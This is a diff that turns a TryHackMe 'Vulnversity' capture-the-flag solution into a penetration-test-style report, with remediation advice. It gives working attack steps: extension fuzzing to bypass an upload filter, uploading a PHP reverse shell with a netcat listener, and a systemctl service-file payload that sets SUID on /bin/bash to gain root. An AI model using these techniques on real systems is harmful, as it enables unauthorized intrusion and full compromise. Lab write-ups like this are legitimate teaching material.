@@ -1,79 +1,287 @@
-# Vulnversity - solution
+---
+layout: default
+title: Vulnversity
+---
+
+# 📝 Vulnversity - Solution
 - Link: https://tryhackme.com/room/vulnversity
 - Difficulty: `easy`
 
-## Host recognition
-- `cd nmap`
--  `nmap --open <IP> -oG scan`
- -  `extractPorts scan` (custom command) to copy open ports
-- `nmap -sCV -p21,22,139,445,3128,3333 <IP> -oN ports`
+---
 
-## Port 3333 (Apache http) - website recognition
-- `gobuster dir -u http://<IP>:3333 -w /usr/share/wordlists/dirb/common.txt -o hidden_dir` to discover hidden directories
-- Found `/internal`
-- Found an input form on `http://<IP>:3333/internal`
-- Tried to brute force that form with any possible file extension
-- On browser:
-  - Added FoxyProxy extension (`127.0.0.1:8080` as proxy)
-- On Burpsuite:
-  - `Proxy` -> `Intercept on`
-- On browser:
-  - Started FoxyProxy 
-  - Uploaded a random file on the `http://<IP>:3333/internal` input form
-- On Burpsuite:
-  - Sent to Intruder the error message 
-  - On `Intruder` window:
-    - Removed all the `$` characters and added them only between `.png` (uploaded a .png file in my case)
-  - On `Payload` window:
-    - `Load` -> `/usr/share/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt`
-    - Unchecked `URL-encode these characters` option
-    - Started the attack
-    - Found `.phtml` as extension with a different response lenght, so I could exploit this vulnerability uploading a `.phtml` file 
+# ☰ 1. Executive Summary
 
-## Exploitation
-- `cd scripts`
-- Downloaded `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php` 
-- Set my own IP and a random port in that code
-- Uploaded the file
-- `nc -lvnp <port>` to make NetCat listen on the specified port
-- Visited `http://<IP>:3333/internal/upload` and run the uploaded file (this hidden subdirectory should appear if we run `gobuster dir -u http://<IP>:3333/internal -w /usr/share/wordlists/dirb/common.txt -o hidden_dir`)
-- Inside the reverse shell:
-  - `cd /home/bill`
-  - `cat user.txt`
-    - Found the `USER FLAG`
-  
-## Privileges escalation
-- Inside the reverse shell:
-  - Couldn't access `/root`, so:
-  - `find / -perm -4000 2>/dev/null` to find binaries 
-  - `sudo -l` to discover which binary the active user may run as superuser
-  - Found `systemctl`
-- Checked it on https://gtfobins.github.io and found how to exploit the binary
-- On another window, modified:
+The objective of this assessment was to identify security weaknesses in the exposed services and obtain both user-level and root-level access.
+
+The attack chain included:
+- Service enumeration
+- Web directory enumeration
+- File upload extension bypass
+- Remote Code Execution (RCE)
+- Reverse shell access
+- Privilege escalation via a misconfigured `systemctl` binary
+
+Full administrative (root) compromise was successfully achieved.
+
+**Overall Risk Rating: Critical**
+
+---
+
+# 🛠️ 2. Scope and Methodology
+
+## Scope
+
+- Single Linux target machine
+- No credentials provided
+- External attacker perspective
+
+## Methodology
+
+The following penetration testing phases were performed:
+
+1. Reconnaissance
+2. Service Enumeration
+3. Web Enumeration
+4. File Upload Testing
+5. Initial Access
+6. Post-Exploitation Enumeration
+7. Privilege Escalation
+
+## Tools Used
+
+- Nmap
+- Gobuster
+- Burp Suite
+- FoxyProxy
+- Netcat
+- PentestMonkey PHP Reverse Shell
+- GTFOBins
+- Native Linux enumeration commands
+
+---
+
+# 🔍 3. Reconnaissance
+
+## 3.1 Port Discovery
+
+Initial scan:
+
+```bash
+nmap --open <TARGET_IP> -oG scan
 ```
+
+Service and version detection:
+
+```bash
+nmap -sCV -p21,22,139,445,3128,3333 <TARGET_IP> -oN ports
+```
+
+### Open Ports Identified
+
+| Port | Service | Version |
+|------|----------|----------|
+| 21 | FTP | vsftpd |
+| 22 | SSH | OpenSSH |
+| 139 | NetBIOS | Samba |
+| 445 | SMB | Samba |
+| 3128 | HTTP Proxy | Squid |
+| 3333 | HTTP | Apache HTTP Server |
+
+---
+
+# 🌐 4. Web Enumeration (Port 3333)
+
+Directory enumeration was performed using Gobuster:
+
+```bash
+gobuster dir -u http://<TARGET_IP>:3333 -w /usr/share/wordlists/dirb/common.txt
+```
+
+Discovered directory:
+
+```
+/internal
+```
+
+The `/internal` endpoint exposed a file upload functionality.
+
+## 4.1 File Upload Analysis
+
+The upload form initially rejected executable PHP files.
+
+Using Burp Suite Intruder together with FoxyProxy, a file extension fuzzing attack was performed against the upload request.
+
+Payload list:
+
+```
+/usr/share/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt
+```
+
+A different response length identified the `.phtml` extension as accepted by the application.
+
+### Findings
+
+The application validated uploads based only on the file extension, allowing executable `.phtml` files to bypass the filter.
+
+### Vulnerability Identified
+
+**Unrestricted File Upload**
+
+The upload mechanism failed to properly validate executable files, allowing attackers to upload server-side scripts.
+
+- Severity: High
+- Impact: Remote Code Execution
+
+---
+
+# 🔐 5. Initial Access (Web Exploitation)
+
+A PentestMonkey PHP Reverse Shell payload was configured with the attacker's IP address and listening port.
+
+The payload was uploaded using the `.phtml` extension.
+
+A Netcat listener was started:
+
+```bash
+nc -lvnp <PORT>
+```
+
+A second directory enumeration revealed the upload directory:
+
+```bash
+gobuster dir -u http://<TARGET_IP>:3333/internal -w /usr/share/wordlists/dirb/common.txt
+```
+
+Discovered:
+
+```
+/internal/uploads
+```
+
+The payload was executed by visiting:
+
+```
+http://<TARGET_IP>:3333/internal/uploads/<payload>.phtml
+```
+
+A reverse shell was successfully established.
+
+The user flag was retrieved:
+
+```bash
+cd /home/bill
+cat user.txt
+```
+
+---
+
+# 🔓 6. Post-Exploitation
+
+After obtaining shell access, local privilege escalation enumeration was performed.
+
+The current user did not have permission to access the `/root` directory.
+
+Enumeration commands included:
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+and
+
+```bash
+sudo -l
+```
+
+The `systemctl` binary was identified as exploitable.
+
+---
+
+# 📶 7. Privilege Escalation
+
+## 7.1 Sudo Permissions Enumeration
+
+The following binary could be abused for privilege escalation:
+
+```
+systemctl
+```
+
+GTFOBins confirmed that the binary could be used to execute arbitrary commands with elevated privileges.
+
+## 7.2 Exploitation
+
+A malicious service file was created:
+
+```bash
 TF=$(mktemp).service
-echo '[Service]
-Type=oneshot
-ExecStart=/bin/sh -c "id > /tmp/output"
-[Install]
-WantedBy=multi-user.target' > $TF
-./systemctl link $TF
-./systemctl enable --now $TF
-```
-to
-```
-TF=$(mktemp).service
+
 echo '[Service]
 Type=oneshot
 ExecStart=/bin/sh -c "chmod +s /bin/bash"
 [Install]
 WantedBy=multi-user.target' > $TF
+
 /bin/systemctl link $TF
 /bin/systemctl enable --now $TF
 ```
-- Inside the reverse shell:
-  - Pasted that modified code
-  - `whoami` to check if I were the root user
-  - `cd /root`
-  - `cat root.txt`
-    - Found the `ROOT FLAG`
+
+The command granted the SUID bit to `/bin/bash`.
+
+A root shell was then obtained:
+
+```bash
+bash -p
+```
+
+Verification:
+
+```bash
+whoami
+```
+
+Output:
+
+```
+root
+```
+
+Finally, the root flag was retrieved:
+
+```bash
+cd /root
+cat root.txt
+```
+
+---
+
+# 🎯 8. Vulnerability Summary
+
+| Vulnerability | Description | Severity |
+|---------------|------------|----------|
+| Unrestricted File Upload | Executable `.phtml` files bypassed upload restrictions. | High |
+| Remote Code Execution | Uploaded server-side scripts allowed arbitrary command execution. | Critical |
+| Misconfigured `systemctl` | The binary could be abused to obtain root privileges. | Critical |
+
+---
+
+# ⚠️ 9. Risk Assessment
+
+The combination of an insecure file upload mechanism and a misconfigured privileged binary allowed a complete compromise of the target system.
+
+The most severe issue was the ability to bypass upload restrictions using the `.phtml` extension, leading to remote code execution and ultimately full administrative access through privilege escalation.
+
+**Overall Risk: Critical**
+
+---
+
+# 🩹 10. Solutions
+
+1. Restrict uploads to a whitelist of approved file types.
+2. Validate uploaded files using MIME type and file content inspection.
+3. Disable execution of scripts inside upload directories.
+4. Store uploaded files outside the web root.
+5. Remove unnecessary privileges from `systemctl` and other administrative binaries.
+6. Regularly audit sudo permissions and SUID-enabled binaries.
+7. Apply the principle of least privilege.
+8. Monitor file upload activity and privilege escalation attempts through centralized logging.
